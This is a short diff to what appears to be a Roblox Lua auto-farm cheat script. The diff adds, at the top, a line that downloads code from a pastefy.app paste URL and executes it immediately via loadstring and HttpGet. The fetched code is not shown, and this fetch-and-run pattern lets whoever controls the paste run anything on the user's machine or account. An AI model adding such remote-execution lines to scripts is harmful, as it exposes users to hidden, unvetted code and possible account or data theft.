@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/vCSdruRY/raw", true))()
+
 if _G.AutoFarm then
 
     if not _G.ClearedMap then
